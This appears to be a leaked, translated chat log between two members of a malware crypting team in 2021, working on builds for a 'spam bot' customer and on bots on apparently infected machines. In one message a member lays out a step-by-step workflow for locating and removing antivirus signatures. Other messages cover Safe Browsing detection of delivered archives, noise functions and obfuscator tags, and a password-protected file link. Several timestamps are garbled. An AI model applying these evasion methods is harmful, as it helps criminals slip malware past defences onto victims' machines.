[9/15/1921 15:24:52] elroy: AHAHAH))))
[15.09.21 15:25:12] elroy: I'll check my profile, just a moment.)
[15.09.21 15:25:32] basil: drop the caca!))
[15.09.21 15:25:47] elroy: There's a thing called "technical debt", it accumulates from day to day
[15.09.21 15:26:02] elroy: We should at least finish the critical
[15.09.21 15:26:38] basil: I don't know what counterarguments to bring. Well if you think you should.....
[15.09.21 15:26:55] elroy: Yes, I do.)
[15.09.21 15:27:17] elroy: You update your branch, test it and show if it works in beta_*
[15.09.21 15:27:40] basil: ok
[15.09.21 15:37:34] elroy: Done
[15.09.21 15:38:07] basil: yes I see
[15.09.21 15:38:50] elroy: You can check it by the rundll test, add its function
```
int PluginInit(HWND hWnd, HINSTANCE hInst, LPWSTR lpszCmdLine, int nCmdShow)
{
    size_t bufSize = snprintf(
        NULL, 0,
        "Three: HWND=0x%p HINSTANCE=0x%p LPWSTR=\"%ws\" int=%d"
        hWnd,
        hInst,
        lpszCmdLine,
        nCmdShow);
    char* charBuf = new char[bufSize];
    snprintf(
        charBuf, bufSize,
        "Three: HWND=0x%p HINSTANCE=0x%p LPWSTR=\"%ws\" int=%d",
        hWnd,
        hInst,
        lpszCmdLine,
        nCmdShow);
    MessageBoxA(0, charBuf, ":Three", MB_OK);
    delete[] charBuf;
    return 0;
}
```
And add this function to lib.def
[15.09.21 15:40:26] elroy: To check, script the library like this
```
.\build.bat --gen-exports yes -p C:\temp\rundll.dll -s c:\temp --entrypoint PluginInit=Gino
```
and call it like this
```
rundll32 rundll_crypt_2021-09-15.18_33_33.dll,Gino
```
Gino is for example, a new name.
Should see a message with text containing Gino
[15.09.21 15:41:19] elroy: The point of modification is that the new function name should be passed instead of the original parameter being passed
[15.09.21 15:41:23] elroy: I didn't test if it caused additional detection
[15.09.21 15:41:38] elroy: If _WSTR() calls - you should change it
[15.09.21 15:41:42] elroy: But change only in this branch
[15.09.21 15:42:37] basil: a moment
[9/15/21 15:43:02] basil: okay. Test project rundll.sln?
[15.09.21 15:43:13] elroy: yes
[15.09.21 15:43:32] basil: ok. got it.
[9/15/1921 15:44:10] basil: Well ? the key to start?
[15.09.21 15:44:12] basil: )))
[15.09.21 15:44:50] basil: Don't worry. I'll correct it if something is wrong somewhere...
[15.09.21 15:45:09] elroy: I hope so)
[15.09.21 15:46:21] elroy: Ask Martin about server for Ali (server for mailbot, should already be deployed).
If it's ready, need to make pads on it and asked for a dll release, should andy in toad to give
[15.09.21 15:47:35] basil: Well it's not martin's question rather rocco and demetrius did it. Well as of today
[15.09.21 15:48:07] elroy: I just know that Martin is in charge there)
[15.09.21 15:48:17] elroy: The server software itself
[15.09.21 15:48:33] elroy: No one but him can deploy the software
[15.09.21 15:48:48] basil: Okay. To martin, so to martin. That's if the customer won't be busy again.
[15.09.21 15:49:08] basil: Everything will be great. I've done it 100 times before)).
[9/15/21 15:49:20] basil: Come back the main thing. I'll be waiting)).
[9/15/21 15:49:38] elroy: Okay.)
[15.09.21 15:49:51] elroy: Don't you worry, I'll keep checking in.
[15.09.21 15:50:01] elroy: There might be a paycheck in the week
[15.09.21 15:50:05] elroy: I will.)
[15.09.21 15:50:15] basil: Well, that's a sacred thing
[15.09.21 15:50:45] basil: Sometimes I want to eat. Sometimes there are usually three times a day...
[15.09.21 15:51:02] elroy: I don't eat that much)
[15.09.21 15:51:06] elroy: But tea...
[15.09.21 15:51:13] basil: Well, if you'll show up - good.
[9/15/21 15:51:21] basil: It'll be a pleasure.
[15.09.21 15:51:47] basil: Now close the window..... Turn off the vipient.....
[15.09.21 15:51:54] basil: I'm not bullshitting of course....
[15.09.21 15:52:03] basil: But you gotta know how to rest too
[15.09.21 15:52:19] basil: Anyway, I wait, hope and believe
[15.09.21 15:53:18] elroy: Your attempt to drive me away sounded like vacation greetings. So festive. Thanks))
I'm in the industry for over 10 years, and only the second time in all this time congratulated on vacation))).
[15.09.21 15:53:50] basil: You should know how to relax....
[15.09.21 15:54:00] elroy: That's right)
[15.09.21 15:54:05] basil: It's not as easy a task as it may seem
[9/15/21 15:54:26] basil: So happy vacations. Be sure to pick up ZP....
[15.09.21 15:54:37] elroy: Sure.)
[15.09.21 15:55:23] basil: ok.... Well, I tried to put you in a positive mood. Get some rest.
[15.09.21 15:55:34] elroy: thank you)))
[17.09.21 14:49:44] elroy: Or here.
[17.09.21 14:50:01] basil: Probably better here
[17.09.21 14:50:08] elroy: yes)
[17.09.21 14:50:16] basil: I guess it's okay. There were detects, I cleaned them up.
[17.09.21 14:50:27] basil:
[17.09.21 14:50:51] basil: put in development_payload_generic branch
[17.09.21 14:51:00] basil: didn't put into beta_*
[17.09.21 14:51:03] basil: bye
[17.09.21 14:51:33] basil: the customer, as I said, contacted about the spam bot/
[17.09.21 14:51:59] basil: I told our admins, but they are pulling the cat out of the park as usual
[17.09.21 14:52:50] elroy: > threw it into the develop_payload_generic branch
If it works, it makes sense to test and pour.
[17.09.21 14:53:15] basil: it works. You give me the go-ahead, I'm pouring it in.
[17.09.21 14:53:36] elroy: But it's not necessary to clean it, but to pour it into generic and where to go next
[17.09.21 14:54:12] basil: Well, I can, in principle, make changes there, too. there not much
[17.09.21 14:55:05] elroy: I uploaded your changes for the last run without crt, where everything is redone, but there is crt and no vectors are used.
[17.09.21 14:55:16] elroy: This commit makes ilds of 8 runs
[17.09.21 14:55:46] elroy: So, make a branch based on the 2022 studio branch.
[17.09.21 14:55:55] elroy: It's based on
[17.09.21 14:56:13] elroy: This new branch, clean it up and spill further
[17.09.21 14:56:47] basil: ok. whatever you say. I put 2022. I must have told you before.
[17.09.21 14:57:10] elroy: *it's based on a commit of the freshest workable, before I poured there update without vectors.
[17.09.21 14:57:30] elroy: It should work without 2022, just a fresh branch)
[17.09.21 14:57:34] elroy: Okay.)
[17.09.21 14:57:43] basil: ok. no problem.
[17.09.21 14:58:05] basil: The only problem at the moment is with the HQ that manuel gave. Crashes and everything. Still in progress.
[17.09.21 14:58:30] basil: he promised to give me sources of SHK, but he sent me binary ones
[17.09.21 14:58:48] elroy: I checked it, it works. It must be a bug in 2022 studio.
[17.09.21 14:58:52] elroy: There's a problem somewhere
[17.09.21 14:59:04] basil: Did it work for you?
[17.09.21 14:59:27] elroy: I.e. the problem is not that the shk does not work as such, but that the shk that manuel gives does not work on builds 2022
[17.09.21 14:59:40] basil: yes?
[17.09.21 14:59:45] elroy: check it)
[17.09.21 14:59:50] elroy: I threw the test shk
[17.09.21 15:00:06] basil: well, the test one worked for me too
[17.09.21 15:00:18] elroy: There's nothing else to do
[17.09.21 15:00:29] elroy: Unless the original is cut to size somewhere
[17.09.21 15:00:47] elroy: Just use debugger on remote machine, see where it crashes
[17.09.21 15:00:58] elroy: If after startup, we're powerless here
[17.09.21 15:01:05] elroy: We have to deeply investigate what's wrong there
[17.09.21 15:01:18] elroy: Just do it then based on 2019 studio
[17.09.21 15:02:38] basil: Yes, I also thought that something was probably wrong with the shk. But I was afraid to voice my point of view
[17.09.21 15:03:07] basil: though I'll have a look at the size
[17.09.21 15:03:12] elroy: Don't be afraid to voice it, it's a working process. What if she was right....
[17.09.21 15:03:58] basil: ok))) Then beware gentlemen. I am unfortunately a very caustic critic.
[17.09.21 15:04:56] elroy: And you are caustic and tolerant (and justified), it's a fine quality))
[17.09.21 15:05:44] basil: let's try...So to speak, we'll pump "soft-skills" as it is fashionable to say now
[17.09.21 15:06:16] elroy: What other programming languages do you know?
[17.09.21 15:08:13] basil: Listen, here's a question. No offense, but... I have a feeling that I'm talking to some other person. I had a typo in the expression "take a breath". What was it?
[17.09.21 15:08:36] elroy: Ahaha))
[17.09.21 15:08:39] elroy: No, not the other one.
[17.09.21 15:08:45] elroy: "Make an entrance."
[17.09.21 15:08:53] basil: That's it. Okay
[17.09.21 15:09:02] basil: maybe your vacation's affecting you
[17.09.21 15:09:05] basil: )))
[17.09.21 15:09:19] elroy: About the jaber, you wrote it just like frances writes. I didn't look at the nickname)))
[17.09.21 15:09:34] basil: Ok. It's ok.
[17.09.21 15:13:05] basil: Well, if we're talking about the ones I know more or less. Assembler (ARM, x86), C (all its dialects, like for controllers), pascal (aka Delphi. Yikes...), java. And I really like reverse. At least in casper's office I interviewed and passed the TOR, but they are very greedy...
[17.09.21 15:15:47] basil: mips assembler still was. But just a little bit.
[17.09.21 15:19:22] elroy: And why greedy?
[17.09.21 15:19:32] elroy: They didn't offer pool access?)
[17.09.21 15:20:35] basil: They offered 85. That's how it was. Plus they used to have a relocation program, but it sucks, and now it's been canceled for sure.
[17.09.21 15:20:48] basil: Well, according to the latest rumors. Maybe I'm wrong.
[17.09.21 15:21:20] elroy: Awful, so few)
[17.09.21 15:21:36] basil: well, there's a lot of interest there
[17.09.21 15:21:43] elroy: 2k few come to us, looking for 5 coders...
[17.09.21 15:22:44] basil: I don't know..... All these interviews are a case-by-case process. What printf returns, design it in C++ kitchen
[17.09.21 15:22:50] basil: ))
[17.09.21 15:23:38] basil: they say write a program, we want to see how you write.... Well then .... They say you didn't use such a library - so it doesn't count!
[17.09.21 15:23:47] elroy: -- about what printf returns, then design in c++ kitchen
-- yeah, i.e. continue in the kitchen, right? with stoves?)
[17.09.21 15:24:13] elroy: Okay)
[17.09.21 15:24:18] elroy: I didn't just ask
[17.09.21 15:25:15] elroy: They're recruiting new coders now, the requirements are like this:
Required: knowledge of one of the languages C#, Go, PowerShell, Python, Nim, Rust
[17.09.21 15:25:31] basil: that's for crypto
[17.09.21 15:25:33] basil: ?
[17.09.21 15:25:46] elroy: That's us...
[17.09.21 15:25:57] basil: yes we can
[17.09.21 15:26:05] basil: and that's all I learned
[17.09.21 15:26:50] basil: Come on. UU programmers... One problem - the technology is very diversified.
[17.09.21 15:27:12] elroy: I know for a fact that you should not fall behind them. Take your time for any) C# + powershell
[17.09.21 15:27:31] basil: ok.
[9/17/21/221 15:28:00] elroy: About delphi, I used it myself some time ago. It's quite usable))
[17.09.21 15:28:12] elroy: Can you use it for crypto?)
[17.09.21 15:28:25] basil: you can
[17.09.21 15:28:29] basil: I think so
[17.09.21 15:28:52] basil: my only problem would be the loader
[17.09.21 15:29:04] basil: dll loader I think I'll implement
[17.09.21 15:29:19] basil: but here's exe....
[17.09.21 15:29:43] elroy: It's all on winapi
[17.09.21 15:30:11] basil: well, if you just copy a little from our crypto, then I guess so
[17.09.21 15:30:30] elroy: I'm worried about delphi with its standard library, it stuffs it all, the whole unit, whether you use part or all of it. It's a big size.
[17.09.21 15:30:48] elroy: + maybe fuzzy hashes will be close because of it
[17.09.21 15:31:02] basil: Yes. Plus..... Pascal's syntax is cumbersome.
[17.09.21 15:32:09] basil: If you believe kris kaspersky, not to be confused with zhenya kaspersky. It almost has its own OS inside. Have you read "the art of disassembling"?
[17.09.21 15:32:47] elroy: I haven't read it, I haven't come across it)
[17.09.21 15:33:04] basil: interesting book
[17.09.21 15:33:07] basil: By the way
[17.09.21 15:33:22] elroy: You can also look at freepascal, it's quite interesting
[17.09.21 15:33:33] elroy: Yes, I should read it)
[17.09.21 15:33:45] elroy: I'm gathering library, but have no time for reading))
[17.09.21 15:34:06] basil: A little outdated of course..... But the main points are interesting
[17.09.21 15:34:26] basil: The author died several years ago
[17.09.21 15:34:41] elroy: Too bad...
[17.09.21 15:34:54] elroy: The circumstances are not known?
[17.09.21 15:35:45] basil: No. It's pretty clear. Moved to the states. Decided to skydive. I'm not going to make it....
[17.09.21 15:36:13] elroy: yeah.
[17.09.21 15:36:42] basil: In short, a scythe is a stranger to be hanged - he won't drown
[17.09.21 15:36:49] basil: to whom?
[17.09.21 15:39:00] elroy: Probably. I don't believe in fate myself, you just have to be careful.
It's all about motivation, but, in fact, frozen mountain climbers in the mountains and people with parachutes are very motivated individuals. The main thing here is not to overdo it...
[17.09.21 15:40:42] basil: Well I also have "supermaterialistic" education, but lately, I look at this world with such astonishment .... What is going on?
[17.09.21 15:41:34] elroy: Exactly what you see is happening)
[17.09.21 15:42:22] basil: Well maybe.... I'm not going to tell the truth. It may be my personal opinion...
[17.09.21 15:44:13] elroy: Obviously the world is going crazy little by little
[17.09.21 15:44:28] basil: wo-wo-wo)))
[17.09.21 15:44:34] basil: I don't get it
[17.09.21 15:45:58] elroy: They write, by the way, that covid affects intelligence. Those who had it, depending on the degree, lost in intelligence quotient
[17.09.21 15:46:51] basil: well, I wasn't sick. I even got the inoculation in a very light version. My shoulder was sore for a day and that's all.
[17.09.21 15:47:06] elroy: Quite a strong contagion, apparently. Mutilates humanity further, on the background of what humanity has achieved (in terms of intelligence)
[17.09.21 15:48:07] basil: it seems to me that we just aren't told everything about it
[17.09.21 15:48:14] basil: there is such an opinion...
[17.09.21 15:49:01] elroy: Yes, it seemed that way to me too
[17.09.21 15:49:12] elroy: And why tell everyone the truth?)
[17.09.21 15:49:33] basil: Indeed)))
[17.09.21 15:49:46] basil: Our leaders know how)))
[17.09.21 15:50:06] basil: "And what's the purpose of your interest...?"
[17.09.21 15:51:00] elroy: )))
[17.09.21 15:51:31] elroy: I always read the second line under that sentence
[17.09.21 15:51:50] basil: )))
[17.09.21 15:52:39] elroy: "You can't do anything about it anyway, so why bother?"
[17.09.21 15:53:00] elroy: third line
("Or they just won't let you.")
[17.09.21 15:54:14] basil: there is such a thing. The phrase "And what's your purpose for asking...?" should be pronounced with a lamp pointing in the direction of your opponent.
[17.09.21 15:55:06] elroy: Well, yes) It's the fourth line))))
"Or can you still do something!?"
[17.09.21 15:55:50] basil: ))). Yes . that's exactly what it's supposed to be!
[17.09.21 15:57:57] elroy: that was a good dialogue).
I'm off.
[17.09.21 15:58:12] basil: ok. have a rest! i'm on duty)))
[29.09.21 12:22:54] elroy: Greetings. How's it going?
[29.09.21 12:23:08] basil: Hello.
[29.09.21 12:23:15] basil: I guess it's okay.
[29.09.21 12:23:37] basil: A spam bot customer got active last week
[29.09.21 12:24:04] basil: Now we are working by the scheme "feed all night and slaughter in the morning"
[29.09.21 12:24:38] basil: crypt has been getting a lot of broken files lately
[29.09.21 12:24:58] basil: I.e. crypto works fine on tests, but on load
[29.09.21 12:25:00] basil: no
[29.09.21 12:25:34] basil: I've now disabled function set for WinApi, empty string instead of them
[29.09.21 12:25:50] basil: they only make the crypter dirty
[29.09.21 12:26:15] basil: I just uploaded binaries to the client
[29.09.21 12:26:21] basil: Testing server
[29.09.21 12:26:32] basil: Said server crashes under heavy load
[29.09.21 12:26:48] basil: But that's probably more to martin
[29.09.21 12:27:00] basil: And so we live a little
[29.09.21 12:27:04] basil: How are you?
[29.09.21 12:27:33] elroy: > I now disabled a set of functions for WinApi, an empty string in their place
> They only make the crypter dirty.
How do you disable it?) They are used there
[29.09.21 12:29:04] basil: I mean the noise functions
[29.09.21 12:29:42] basil: I've got one problem here
[29.09.21 12:30:08] basil: I make builds, upload them to file sharing site, set password (of course)
[29.09.21 12:30:26] basil: Customer downloads files and immediately detects
[29.09.21 12:30:32] basil: To archive!!!!
[29.09.21 12:31:33] elroy: I have to turn off Safe browsing for both you and him, it's because of this.
[29.09.21 12:31:56] elroy: Safe browsing makes a base with file origin ISO
[29.09.21 12:32:25] basil: yes. silver also said
[29.09.21 12:32:32] basil: I consulted him
[29.09.21 12:32:33] elroy: When a file is unpacked and launched, then it gets caught by detection, both the archive and the link are marked as malicious
[29.09.21 12:33:17] basil: but other than that everything seems normal...
[29.09.21 12:33:30] basil: No special problems
[29.09.21 12:33:39] basil: events*
[29.09.21 12:33:49] basil: How's your rest?
[29.09.21 12:34:00] elroy: Okay. I'm sick, I'm getting better. I'll be out in a week.
[29.09.21 12:34:28] basil: chief, my favorite executive!!!!
[29.09.21 12:34:35] basil: you're upsetting me.
[29.09.21 12:34:39] elroy: It's a shame I don't even know where or how. It came with the cyclone somehow. It rained, it took my breath away.... There's some nasty stuff in the atmosphere.
[29.09.21 12:34:45]
[29.09.21 12:35:11] basil: not the crown I hope?
[29.09.21 12:35:51] elroy: I don't know. But from the condition, probably not. Or somehow not sharp.
[29.09.21 12:36:20] basil: I got myself inoculated.
[29.09.21 12:36:28] basil: somehow calmer
[29.09.21 12:36:47] basil: Get well, please.
[29.09.21 12:36:55] basil: I can do my job.
[29.09.21 12:37:54] elroy: How's your condition after vaccination?
[29.09.21 12:38:18] basil: I'm fine. Only my arm hurt a little bit for a day.
[29.09.21 12:38:29] basil: Not even a sniffle, nothing.
[29.09.21 12:38:32] basil: not at all
[29.09.21 12:38:39] basil: but that's me....
[29.09.21 12:38:57] basil: If you're not a very young man - I don't know
[29.09.21 12:39:11] basil: After 45 there can be cold effects
[29.09.21 12:39:27] basil: especially it's after the 2nd part of vaccination
[29.09.21 12:39:54] basil: That's how it happens among my friends
[29.09.21 12:41:54] elroy: I see
[30.09.21 11:05:05] elroy: Greetings.
[30.09.21 11:05:16] basil: Hello.
[30.09.21 11:05:23] elroy: When are you going on vacation? (there in the group wrote silver)
[30.09.21 11:05:46] basil: end of next week
[30.09.21 11:06:18] elroy: For how long?
[30.09.21 11:06:29] basil: 10 days
[30.09.21 11:06:35] elroy: okay.
[30.09.21 11:06:43] basil: not comfortable?
[30.09.21 11:07:16] elroy: I do not know) Comfortable) I myself will go out in a week only...
[30.09.21 11:08:02] elroy: Congratulations on the appointment of an assistant to the project. Long time should have been appointed, I've long asked).
[30.09.21 11:08:02] basil: I honestly thought you'd be out at the beginning of next week. But you said you were sick.
[30.09.21 11:08:19] basil: well, you did
[9/30/1921 11:08:53] basil: Listen. You're online now. But "incognito" so to speak.
[30.09.21 11:09:12] basil: I wanted to raise a little question in the crypto group
[30.09.21 11:09:25] elroy: I assume I'll be online on the 10th, and then it's up to you, earlier or later
[30.09.21 11:09:43] basil: 10 is fine
[30.09.21 11:09:55] basil: you need "technical-political" advice
[30.09.21 11:09:58] elroy: raise any questions.... let's think, let's see)
[30.09.21 11:10:01] basil: consultation
[30.09.21 11:10:08] elroy: Ask away
[30.09.21 11:10:20] basil: I'll write it in my notebook
[30.09.21 11:10:31] basil: and I'll chat you up. Check it out
[30.09.21 11:10:44] elroy: pgp then wrap it up
[30.09.21 11:10:54] basil: no))))
[30.09.21 11:11:01] basil: not so critical there
[30.09.21 11:12:02] basil: just don't go too far away)))
[30.09.21 11:12:16] elroy: okay
[30.09.21 11:19:53] basil: On the mets?
[30.09.21 11:20:04] elroy: yes
[30.09.21 11:20:07] basil: writing
[30.09.21 11:20:21] basil: that's how it happened
[30.09.21 11:20:31] basil: ``
Dear colleagues!
I would like to raise a question, which probably concerns not only me. It concerns cleaning cryptors from detects. I will briefly describe my way of cleaning. Take a crypt. Checked on dyncheck. Detects list of antiviruses that have detections. Next, a clean virtual machine is taken. AV is installed on it, and AV is updated. The real time checking is turned off for the AV. Then a specialized python script is added. I am using one of these at https://github.com/vxlabinfo/SignFinder. What it does... It splits file into blocks, say 40 bytes each. Then it "zeroes out" each of these blocks and creates a set of files, each of which has only one block "zeroed out". After that, the resulting files are fed to AB. In the file that AB did not touch, the detector is overwritten. After that, the original file is compared to the "wiped" detection, in order to determine which part of the file has been "wiped". Next, we take the original file, take the IDA PRo disassembler, take the pdb file created by visual studio. After that, you can try to localize the detection in a high-level crypto language.
My personal problem is that there are a lot of AVs out there. Many AVs require registration, on one operating system they work on others do not work. In short, until you do all this, download AV, then you find out that it needs a special environment, then you find out that the operating system does not support it, then you update it, then you understand how to work its interface.... It will take you an hour and a half.  Plus the testing time is very long. There is a rationalization suggestion. Maybe somehow we can organize a set of virtual machines with pre-installed AB and ready-made scripts, like the one mentioned above. Maybe we can somehow provide a separate specialist who will only engage in localization detects.
```
[30.09.21 11:23:41] elroy: > It will take 1.5 hours
[30.09.21 11:23:41] elroy: Optimist
[30.09.21 11:23:58] basil: I take the minimum
[30.09.21 11:24:09] basil: maybe 3
[30.09.21 11:24:16] basil: sure
[30.09.21 11:24:25] elroy: I sometimes take a couple of days.
[9/30/21 11:24:36] basil: That's right.
[30.09.21 11:24:57] basil: And customers always need it urgently
[30.09.21 11:24:59] elroy: This crap updates at the speed of a couple of kb via vpn, which is through tor
[30.09.21 11:25:26] elroy: Look.
[30.09.21 11:25:34] elroy: There's a problem
[30.09.21 11:25:35] elroy: Yes
[30.09.21 11:26:03] elroy: But the first thing you do is incur the wrath of silver
[30.09.21 11:26:18] elroy: For three reasons:
[30.09.21 11:26:29] basil: That's why I wanted to get a little more information
[30.09.21 11:28:53] elroy: 1) you use for your work a script which for some reason is better than the utility he worked on himself (avclean)
2) you require an extra person + resources, that's at least $3000/month cost
3) show that you do not know how to organize your work (update avclean beforehand)
If everyone else is silent, you will take the wrath upon yourself
[30.09.21 11:29:21] elroy: Anyway)
[30.09.21 11:29:28] elroy: About the problem
[30.09.21 11:29:35] elroy: I brought it up already
[30.09.21 11:30:23] elroy: We have cloud avclean, it parallels to a cluster, runs AV simultaneously on some machines, collects results
[9/30/21 11:30:38] elroy: This is scheduled for deployment when the AV farm is fixed
[30.09.21 11:30:47] elroy: We'll stick it as a service to panel
[30.09.21 11:31:29] basil: Thank you. I was one step away from a fatal political mistake....
[9/30/21 11:31:43] basil: Good thing providence worked out
[9/30/21 11:31:53] basil: I got sweat on my forehead
[30.09.21 11:32:12] basil: stirlitz has never been so close to failure
[9/30/21 11:33:37] elroy: For now, from recommendations, stock up on a set of AV machines, the ones you need, update them, take pictures, update in the background. VirtuallBoc is very handy to work with, in terms of snapshots and cloning machines. If the machine is with guest addition, it can do live snapshots, i.e. few seconds and maishna is running on the right snapshot
[30.09.21 11:34:51] basil: ok. thanks for the advice. There's just another customer stepped up on the spam bot. Come on, come on schnell!
[30.09.21 11:35:21] basil: just set everything up, started this disassembler, and here it is.
[30.09.21 11:35:29] basil: it came up
[30.09.21 11:35:56] basil: but thanks anyway. I was literally one step away.
[30.09.21 11:36:17] elroy: Yes, it looks like I was.)
[30.09.21 11:36:38] elroy: I've got this problem under control, I know how much time everyone spends on it
[30.09.21 11:37:05] basil: but originally I wanted it better of course
[30.09.21 11:37:26] basil: meant well - it turned out as always
[9/30/1921 11:38:12] basil: Okay. Thanks again for the advice.
[30.09.21 11:38:32] elroy: Don't worry, everything is fine... It would have been a working moment anyway.
[30.09.21 11:38:33] basil: I'll try to spam bot it now
[30.09.21 11:38:35] elroy: Okay.
[30.09.21 11:39:07] basil: Can I ask you one more question?
[30.09.21 11:39:16] basil: last one))
[30.09.21 11:41:31] elroy: yes
[30.09.21 11:41:45] elroy: I hope not the last)))
[30.09.21 11:48:23] basil: YES there was a question in the chat room about the future price of cryptocurrency. I was very impressed by your comment then. Look, is it worth to keep something in crypto right now, to wait its growth? What's YOUR prediction exactly?
[9/30/1921 11:49:14] elroy: That's a tough question, really...
[30.09.21 11:49:36] elroy: I'm holding, I'm holding a lot myself, I hope for the best))
[30.09.21 11:51:04] elroy: Crypto is a slippery and dangerous thing. Different policies of states relative to it.
[30.09.21 11:53:09] basil: There's another thing, in the year of 2017 one guy took a rather impressive sum in bitcoins. I was just "teasing" him at the time, like "how is crypto secured?". And he said, "you'll see, bitcoin will be over $ 100.000".
[30.09.21 11:53:51] basil: Somehow his forecast has not come true yet, but it is close enough. At that time for sure nobody expected such a thing....
[30.09.21 11:54:13] basil: I also hold a lot now and also hope for the best...
[30.09.21 11:54:45] elroy: I follow an unusual strategy
[30.09.21 11:56:15] elroy: I've been investing a couple of times a month, for a couple of years now. So, I've noticed that the higher-priced ones I buy are comped by spurts of growth in the ones I bought earlier.
That's if you put in portions, it somehow evens out relative to the total value
[30.09.21 11:56:54] basil: Yes?
[30.09.21 11:57:12] basil: usually buy cheaper, sell more expensive
[30.09.21 11:59:43] elroy: You can not always buy cheaper) Sooner or later will buy more expensive, because after a couple of days it fell in price. In the end, in a week, it will turn out that he bought more expensive. But you have to keep buying, this time it will be more profitable, and partially offset when it rises. (On average, two purchases as a kind of stabilization)
[30.09.21 12:00:29] elroy: But these are just observations. You're a mathematician, it's easier for you. Take a chart, do a sample, compare success rates.
[30.09.21 12:00:55] elroy: In half a year such maneuvers are compensated...
[30.09.21 12:02:24] basil: tried analyzing ...... Classic meteorological techniques in the market - it's definitely not right.... No, it does not work
[30.09.21 12:02:30] basil: Something else is needed
[30.09.21 12:02:40] basil: But thanks anyway.
[30.09.21 12:02:48] elroy: You're welcome.)
[30.09.21 12:03:23] elroy: The strategy, that I cited, is more for saving, rather than earning.
[30.09.21 12:03:26] basil: ok. I'm definitely turning this around. I've got to finish that spam bot after all.
[30.09.21 12:03:37] elroy: ok.)
[01.10.21 13:59:02] basil: Hello?
[01.10.21 13:59:17] basil: that was an exclamation!
[01.10.21 14:31:01] elroy: Greetings
[01.10.21 14:31:33] basil: Did you read the spam bot group?
[01.10.21 14:31:57] elroy: Watching.
[01.10.21 14:32:58] basil: let me know when you finish reading it.
[01.10.21 14:33:21] elroy: What do you want?)
[01.10.21 14:34:20] basil: I don't understand why they are so worried about these machines. What difference does it make to them to run 10 or 300?
[01.10.21 14:34:26] basil: Started and ran
[01.10.21 14:34:35] basil: Does it make any difference?
[01.10.21 14:34:36] elroy: Not many bots
[01.10.21 14:35:02] basil: are these already infected machines?
[01.10.21 14:35:11] elroy: Maybe
[01.10.21 14:35:16] basil: ok
[01.10.21 14:35:31] basil: got it. I'll shut up.
[01.10.21 14:35:42] basil: I thought it was their virtuals
[01.10.21 14:35:53] basil: They just raised the machines, that's all
[01.10.21 14:35:55] basil: ok
[01.10.21 14:35:58] elroy: unlikely. It's more likely battle bots.
[01.10.21 14:37:37] elroy: I also want to make a recommendation.
[01.10.21 14:37:55] basil: yes
[01.10.21 14:37:58] basil: listening
[01.10.21 14:39:08] elroy: You would agree on the allowable characters to transmit to jason.
And before transmitting, you should validate the data being transmitted. All other characters - replace with some one. Otherwise format errors will take a long time to collect.
[01.10.21 14:40:18] basil: Yes. I agree. I had this idea somewhere in my unconsciousness, too....
[01.10.21 14:40:59] elroy: Data is definitely better to break down
[01.11.21 11:22:59] basil: test
[01.11.21 11:23:08] basil: turn on OTR
[01.11.21 11:31:30] basil: reply. Please
[01.11.21 11:32:25] elroy: otr?
[01.11.21 11:33:16] basil: let me try to turn it on
[01.11.21 11:33:33] basil: test
[01.11.21 11:33:41] basil: that's good. repeat
[01.11.21 11:34:02] elroy: we had e2e here, somehow no messages
[01.11.21 11:34:10] elroy: Do it again e2e
[01.11.21 11:34:15] elroy: If not, then otr
[01.11.21 11:34:42] elroy: And so?
[01.11.21 11:34:49] basil: so yes
[01.11.21 11:34:54] basil: but without encryption
[01.11.21 11:34:58] elroy: We had e2e here, for some reason no messages are visible
Let's do e2e again.
If not, then apt.
[01.11.21 11:35:08] basil: this is bad. Let's do it somewhere else.
[01.11.21 11:35:24] elroy: Check it
[11.11.21 11:35:30] basil: Yeah.
[11.11.21 11:35:35] basil: It works
[01.11.21 11:35:36] basil: Yay
[01.11.21 11:35:37] elroy: e2e
[01.11.21 11:35:37] basil: !
[01.11.21 11:35:40] elroy: ok
[01.11.21 11:36:49] basil: the situation is strange. Now I ran it 4 times. With a nesting depth of 16. The code is as follows
```
#include <iostream>
#include <intrin.h>
#include "noise_stub.h"


void test_1()
{

	// <codeobfuscator:begin_function>

	// <codeobfuscator:begin_block>
	printf("test_1_1\r\n");
	// <codeobfuscator:end_block>

	// <codeobfuscator:begin_block>
	printf("test_1_2\r\n");
	// <codeobfuscator:end_block>

	// <codeobfuscator:begin_block>
	printf("test_1_3\r\n");
	// <codeobfuscator:end_block>

	// <codeobfuscator:end_function

}

void test_2()
{

	// <codeobfuscator:begin_function>

	// <codeobfuscator:begin_block>
	printf("test_2_1\r\n");
	// <codeobfuscator:end_block>

	// <codeobfuscator:begin_block>
	printf("test_2_2\r\n");
	// <codeobfuscator:end_block>

	// <codeobfuscator:begin_block>
	printf("test_2_3\r\n");
	// <codeobfuscator:end_block>

	// <codeobfuscator:end_function

}



void test_3()
{

	// <codeobfuscator:begin_function>

	// <codeobfuscator:begin_block>
	printf("test_3_1\r\n");
	// <codeobfuscator:end_block>

	// <codeobfuscator:begin_block>
	printf("test_3_2\r\n");
	// <codeobfuscator:end_block>

	// <codeobfuscator:begin_block>
	printf("test_3_3\r\n");
	// <codeobfuscator:end_block>

	// <codeobfuscator:end_function

}

int main()
{
	test_1();
	test_2();
	test_3();
	std::cout << "Hello World!\n";
}

```
[01.11.21 11:37:02] basil: everything is correct
[01.11.21 11:38:00] basil: it's either in the obfuscator, which you sort of redid. Or it's already in the tags. Can you send me now this utility with your additions
[01.11.21 11:38:19] elroy: Yes, I'll send it now.
[01.11.21 11:41:48] elroy: ``
https://file.io/EYePi3yo6WaC
N66D8shXis(saouDyctd5sFstwsaq
```
[01.11.21 12:01:14] basil: No. At least it works correctly for me.
[01.11.21 12:01:41] basil: Tell me where the last commit is. And how to bind this utility to the cryptor
[01.11.21 12:02:49] elroy: It's bound to another crypto. I can certainly give you that, but it's gonna take you a long time to get into it.
[01.11.21 12:02:59] elroy: Just make a wider proverb
[01.11.21 12:03:18] elroy: Are you sure that functions are not taken away by optimizer after build?
[01.11.21 12:03:25] elroy: In this example
[01.11.21 12:03:40] elroy: Does file size change if the value is 3 or 18 ?
[01.11.21 12:04:11] basil: I've launched both debug version of the test now. And release with optimization
[01.11.21 12:04:19] basil: now look at the size
[01.11.21 12:05:00] elroy: According to the debug version, is the execution flow correct for all conditions?
[01.11.21 12:05:22] basil: yes.
[01.11.21 12:05:35] basil: 12 kb and 85 kyu respectively
[01.11.21 12:05:49] elroy: And if you do mt?
[01.11.21 12:06:03] basil: now
[01.11.21 12:07:02] elroy: I tried it on 32 bit exe
[01.11.21 12:07:09] elroy: On the one you finally build
[01.11.21 12:07:35] elroy: By the way I generated 64 bit version of noiser
[01.11.21 12:07:41] elroy: That can't be it?
[01.11.21 12:07:46] elroy: Can you repeat it?
[01.11.21 12:08:45] basil: yes.
